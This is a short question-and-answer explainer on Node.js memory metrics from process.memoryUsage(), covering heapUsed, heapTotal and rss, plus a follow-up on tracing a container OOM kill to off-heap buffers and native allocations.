`process.memoryUsage()` reports several different ideas. `heapUsed` is the portion of the V8 heap that currently holds JavaScript objects. `heapTotal` is the heap V8 has reserved from the OS, including free space inside that reservation. `rss` is the resident set: the physical memory the whole process occupies, including the heap, code, thread stacks, and native allocations. `heapUsed` can fall after a GC while `rss` stays high, because the OS is not handed those pages back immediately. When someone says "Node is using 1.2 GB," I ask which of these three they graphed.

**Follow-up:**

`heapUsed` is 200 MB and the container is OOM-killed at 1 GB. Where do you look?

Answer: Look outside the V8 heap. Read `external` and `arrayBuffers` first, then think about native addons and thread stacks. Large buffers can blow RSS while `heapUsed` stays calm, and the container kills on RSS.
